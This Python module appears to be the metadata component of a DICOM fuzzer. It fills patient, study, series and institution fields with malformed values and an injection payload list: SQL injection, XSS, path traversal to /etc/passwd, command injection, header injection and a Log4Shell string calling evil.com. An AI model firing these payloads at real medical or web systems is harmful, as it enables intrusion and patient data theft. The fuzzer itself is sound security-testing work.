"""Metadata Fuzzer - Patient, Study, Series, and Institution Metadata Mutations.

Targets DICOM metadata fields across the entire metadata hierarchy:
- Patient identifiers (PatientID, PatientName, PatientBirthDate)
- Patient demographics (PatientSex, PatientAge, PatientWeight, PatientSize)
- Study-level metadata (StudyDate, StudyTime, StudyID, AccessionNumber)
- Series-level metadata (SeriesDate, SeriesDescription, BodyPartExamined)
- Institution and personnel (InstitutionName, StationName, Operators)

Common vulnerabilities:
- SQL injection via metadata fields displayed in web viewers
- XSS via patient name in HTML-based PACS interfaces
- Buffer overflow from overlong metadata values
- Format string attacks in logging systems
- Path traversal in report generation using patient data
- Unicode handling errors in multi-byte patient names
"""

import random
from datetime import datetime, timedelta

from pydicom.dataset import Dataset

from dicom_fuzzer.utils.logger import get_logger

from .base import FormatFuzzerBase

logger = get_logger(__name__)

# Injection payloads that might appear in metadata fields
_INJECTION_PAYLOADS = [
    "'; DROP TABLE patients; --",
    "<script>alert('XSS')</script>",
    "../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
    "%s%s%s%s%s%s%s%s%s%s",
    "{{7*7}}",
    "\x00\x00\x00\x00",
    "A" * 10000,
    "\r\nInjected-Header: value",
    "| cat /etc/passwd",
    "$(touch /tmp/pwned)",
    "&lt;img src=x onerror=alert(1)&gt;",
    "UNION SELECT * FROM users",
    "\x1b[31mRED\x1b[0m",
    "\\\\server\\share\\path",
]

# Malformed Person Name (PN) values
# DICOM PN format: alphabetic^ideographic^phonetic, each with up to 5 components
_PN_ATTACKS = [
    "^^^^^",  # All empty components
    "A^B^C^D^E^F^G",  # Too many component groups
    "A" * 65,  # Over 64-char component limit
    "Name^With^Too^Many^Carets^Here^And^More",  # Excess carets
    "=Equal^Sign",  # Invalid equals in PN
    "\x00Hidden^Name",  # Null byte in name
    "Name\nWith\nNewlines",  # Embedded newlines
    "\\Path\\Like^Name",  # Backslash in name
    "",  # Empty name
    " ",  # Whitespace only
    "^",  # Single caret
    "^^^",  # Just carets
    "Name^Given=Ideographic=Phonetic",  # PN with all 3 groups
    "\xe4\xb8\xad\xe6\x96\x87^ChineseName",  # UTF-8 Chinese chars
    "Smith^John" * 20,  # Repeated name exceeding length
    "DROP^TABLE^patients",  # SQL in name components
]

# Invalid DICOM date (DA) values
_INVALID_DATES = [
    "00000000",  # All zeros
    "99999999",  # All nines
    "20251301",  # Month 13
    "20250132",  # Day 32
    "20250230",  # Feb 30
    "20250000",  # Month/day zero
    "2025",  # Truncated
    "202501",  # Missing day
    "2025-01-01",  # Dashes (wrong format)
    "01012025",  # MMDDYYYY instead of YYYYMMDD
    "20250101120000",  # Date+time in DA field
    "00010101",  # Year 1
    "99991231",  # Year 9999
    "30000101",  # Far future
    "",  # Empty
    "NOTADATE",  # Non-numeric
    "2025/01/01",  # Slashes
]

# Invalid DICOM time (TM) values
_INVALID_TIMES = [
    "250000",  # Hour 25
    "006100",  # Minute 61
    "000061",  # Second 61
    "999999.999999",  # Max boundary
    "-10000",  # Negative
    "12:30:00",  # Colons (wrong format)
    "",  # Empty
    "NOON",  # Text
    "000000.0000001",  # Too many fraction digits
]


class MetadataFuzzer(FormatFuzzerBase):
    """Fuzzer for DICOM metadata across the entire metadata hierarchy.

    Targets patient, study, series, and institution metadata fields
    with injection payloads, boundary values, and format violations.
    """

    @property
    def strategy_name(self) -> str:
        """Return the strategy name for identification."""
        return "metadata"

    def __init__(self) -> None:
        """Initialize with fake patient data for realistic mutations."""
        self.fake_names = ["Smith^John", "Doe^Jane", "Johnson^Mike"]
        self.fake_ids = [f"PAT{i:06d}" for i in range(1000, 9999)]

        self._attack_categories = [
            self._patient_identifier_attack,
            self._patient_demographics_attack,
            self._study_metadata_attack,
            self._series_metadata_attack,
            self._institution_personnel_attack,
        ]

    def mutate(self, dataset: Dataset) -> Dataset:
        """Apply random metadata mutations across 1-3 attack categories.

        This is the FormatFuzzerBase interface method. It applies broader
        metadata fuzzing beyond just patient identifiers.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset

        """
        num_categories = random.randint(1, 3)
        selected = random.sample(
            self._attack_categories,
            k=min(num_categories, len(self._attack_categories)),
        )

        for attack in selected:
            try:
                attack(dataset)
            except Exception:
                pass  # Mutation failures are expected in fuzzing

        return dataset

    def mutate_patient_info(self, dataset: Dataset) -> Dataset:
        """Generate believable but fake patient data.

        This method is preserved for backward compatibility. It always
        sets PatientID, PatientName, and PatientBirthDate with values
        from the fake_ids and fake_names lists.

        Args:
            dataset: DICOM dataset to mutate

        Returns:
            Mutated dataset (same object)

        """
        dataset.PatientID = random.choice(self.fake_ids)
        dataset.PatientName = random.choice(self.fake_names)
        dataset.PatientBirthDate = self._random_date()
        return dataset

    # --- Attack Categories ---

    def _patient_identifier_attack(self, dataset: Dataset) -> None:
        """Attack patient identifier fields with malformed values.

        Targets PatientID, PatientName, and PatientBirthDate with
        injection payloads, boundary values, and format violations.
        """
        attacks = random.sample(
            ["patient_id", "patient_name", "birth_date"],
            k=random.randint(1, 3),
        )

        if "patient_id" in attacks:
            dataset.PatientID = random.choice(
                [
                    "",  # Empty ID
                    "A" * 65,  # Over 64-char LO limit
                    "ID WITH SPACES",
                    "ID\x00HIDDEN",  # Null byte
                    "PAT-" + "9" * 100,  # Extreme length
                    *_INJECTION_PAYLOADS[:5],
                    "0" * 64,  # Max length numeric
                    "ID\tTAB\tSEPARATED",  # Tab characters
                    "PATIENT\\ID\\BACKSLASH",  # Backslashes
                ]
            )

        if "patient_name" in attacks:
            dataset.PatientName = self._random_pn_attack()

        if "birth_date" in attacks:
            dataset.PatientBirthDate = random.choice(_INVALID_DATES)

    def _patient_demographics_attack(self, dataset: Dataset) -> None:
        """Attack patient demographic fields not covered by other fuzzers.

        Targets PatientSex, PatientAge, PatientWeight, and PatientSize
        with invalid codes, boundary values, and type confusion.
        """
        attacks = random.sample(
            ["sex", "age", "weight", "size"],
            k=random.randint(1, 4),
        )

        if "sex" in attacks:
            dataset.PatientSex = random.choice(
                [
                    "",  # Empty
                    "m",  # Lowercase (should be M/F/O)
                    "MF",  # Multiple values
                    "X",  # Invalid code
                    "\x00",  # Null byte
                    "Male",  # Full word instead of code
                    "  M  ",  # Padded
                    "F" * 20,  # Overlong
                ]
            )

        if "age" in attacks:
            dataset.PatientAge = random.choice(
                [
                    "",  # Empty
                    "999X",  # Invalid unit (should be D/W/M/Y)
                    "12345Y",  # Too many digits (should be 3)
                    "12Y",  # Too few digits
                    "ABCY",  # Non-numeric
                    "-01Y",  # Negative
                    "000D",  # Zero age
                    "200Y",  # Impossibly old
                    "999Y",  # Max digits
                    "001",  # Missing unit
                    "Y",  # Missing digits
                    "0100M",  # 5 chars
                ]
            )

        if "weight" in attacks:
            dataset.PatientWeight = random.choice(
                [
                    0,  # Zero weight
                    -1,  # Negative
                    0.0001,  # Near zero
                    999999.99,  # Extremely heavy
                    float("inf"),  # Infinity
                    1e308,  # Near max float
                    1e-308,  # Near min float
                ]
            )

        if "size" in attacks:
            dataset.PatientSize = random.choice(
                [
                    0,  # Zero
                    -1.0,  # Negative
                    0.001,  # Near zero
                    100.0,  # 100 meters
                    float("inf"),  # Infinity
                    1e308,  # Near max float
                ]
            )

    def _study_metadata_attack(self, dataset: Dataset) -> None:
        """Attack study-level metadata fields.

        Targets StudyDate, StudyTime, StudyID, AccessionNumber,
        and ReferringPhysicianName.
        """
        attacks = random.sample(
            ["study_date", "study_time", "study_id", "accession", "referring"],
            k=random.randint(1, 4),
        )

        if "study_date" in attacks:
            dataset.StudyDate = random.choice(_INVALID_DATES)

        if "study_time" in attacks:
            dataset.StudyTime = random.choice(_INVALID_TIMES)

        if "study_id" in attacks:
            dataset.StudyID = random.choice(
                [
                    "",  # Empty
                    "S" * 17,  # Over 16-char SH limit
                    "STUDY\x00ID",  # Null byte
                    *_INJECTION_PAYLOADS[:3],
                    "12345678901234567",  # 17 chars
                    "STUDY WITH SPACES AND MORE TEXT",  # Long with spaces
                ]
            )

        if "accession" in attacks:
            dataset.AccessionNumber = random.choice(
                [
                    "",  # Empty
                    "A" * 17,  # Over 16-char SH limit
                    "ACC\x00NUM",  # Null byte
                    *_INJECTION_PAYLOADS[:3],
                    "0" * 16,  # Max length numeric
                    "ACC-2025-" + "9" * 50,  # Overlong realistic format
                ]
            )

        if "referring" in attacks:
            dataset.ReferringPhysicianName = self._random_pn_attack()

    def _series_metadata_attack(self, dataset: Dataset) -> None:
        """Attack series-level metadata fields.

        Targets SeriesDate, SeriesDescription, and BodyPartExamined.
        """
        attacks = random.sample(
            ["series_date", "description", "body_part"],
            k=random.randint(1, 3),
        )

        if "series_date" in attacks:
            dataset.SeriesDate = random.choice(_INVALID_DATES)

        if "description" in attacks:
            dataset.SeriesDescription = random.choice(
                [
                    "",  # Empty
                    "A" * 65,  # Over 64-char LO limit
                    "CT HEAD W/O CONTRAST\x00HIDDEN",  # Null byte in realistic desc
                    "MR BRAIN <script>alert(1)</script>",  # XSS in description
                    "PET/CT '; DROP TABLE series; --",  # SQL injection
                    "CHEST\nXRAY\nPA\nLATERAL",  # Newlines
                    "DESCRIPTION" * 100,  # Very long
                    "US ABDOMEN ${jndi:ldap://evil.com}",  # Log4Shell in description
                    "\x1b[31mRED SERIES\x1b[0m",  # ANSI escape codes
                ]
            )

        if "body_part" in attacks:
            dataset.BodyPartExamined = random.choice(
                [
                    "",  # Empty
                    "BODY" * 10,  # Overlong CS
                    "head",  # Lowercase (should be uppercase)
                    "NOT A BODY PART",  # Invalid code
                    "CHEST\x00",  # Null terminated
                    "A" * 17,  # Over 16-char CS limit
                    "HEAD;CHEST",  # Semicolon separator
                    "ABDOMEN\nCHEST",  # Newline
                ]
            )

    def _institution_personnel_attack(self, dataset: Dataset) -> None:
        """Attack institution and personnel metadata fields.

        Targets InstitutionName, InstitutionAddress, StationName,
        OperatorsName, and PerformingPhysicianName.
        """
        attacks = random.sample(
            ["institution", "address", "station", "operator", "physician"],
            k=random.randint(1, 4),
        )

        if "institution" in attacks:
            dataset.InstitutionName = random.choice(
                [
                    "",  # Empty
                    "A" * 65,  # Over 64-char LO limit
                    "Hospital <script>alert('XSS')</script>",  # XSS
                    "St. Mary's Hospital'; DROP TABLE institutions;--",  # SQL
                    "HOSPITAL\x00HIDDEN",  # Null byte
                    "General Hospital\nSecond Line",  # Newline
                    "Medical Center" * 50,  # Very long
                    "\xe4\xb8\x8a\xe6\xb5\xb7\xe5\x8c\xbb\xe9\x99\xa2",  # Chinese hospital
                ]
            )

        if "address" in attacks:
            dataset.InstitutionAddress = random.choice(
                [
                    "",  # Empty
                    "A" * 1025,  # Over 1024-char ST limit
                    "123 Main St\x00Hidden Address",  # Null byte
                    "456 Oak Ave\r\nInjected-Header: evil",  # HTTP header injection
                    "ADDRESS" * 200,  # Very long
                    "789 Pine Rd, City, ST 12345\n<script>alert(1)</script>",
                ]
            )

        if "station" in attacks:
            dataset.StationName = random.choice(
                [
                    "",  # Empty
                    "S" * 17,  # Over 16-char SH limit
                    "STATION\x00",  # Null terminated
                    "CT_SCANNER_1'; --",  # SQL in station name
                    "WORKSTATION\nNEWLINE",  # Newline
                    "\x00" * 16,  # All nulls
                ]
            )

        if "operator" in attacks:
            dataset.OperatorsName = self._random_pn_attack()

        if "physician" in attacks:
            dataset.PerformingPhysicianName = self._random_pn_attack()

    # --- Helpers ---

    def _random_date(self) -> str:
        """Generate random but valid DICOM date (YYYYMMDD).

        Returns dates in the range 1950-2010 for realistic patient DOB.
        """
        start_date = datetime(1950, 1, 1)
        end_date = datetime(2010, 12, 31)
        random_date = start_date + timedelta(
            days=random.randint(0, (end_date - start_date).days)
        )
        return random_date.strftime("%Y%m%d")

    def _random_invalid_date(self) -> str:
        """Generate a date that violates DICOM DA format rules."""
        return random.choice(_INVALID_DATES)

    def _random_pn_attack(self) -> str:
        """Generate a malformed Person Name (PN) value.

        DICOM PN format uses carets to separate component groups
        and equals signs between value representations.
        """
        attack_type = random.choice(
            [
                "malformed",
                "injection",
                "boundary",
            ]
        )

        if attack_type == "malformed":
            return random.choice(_PN_ATTACKS)
        elif attack_type == "injection":
            payload = random.choice(_INJECTION_PAYLOADS)
            prefix = random.choice(["Dr.", "Smith^", "Patient^", ""])
            return f"{prefix}{payload}"
        else:  # boundary
            return random.choice(
                [
                    "A" * 64 + "^" + "B" * 64,  # Max component lengths
                    "^" * 100,  # Many carets
                    "\x00" * 20,  # Null bytes
                    " " * 64,  # All spaces
                    "A^B^C^D^E" * 10,  # Repeated structure
                ]
            )
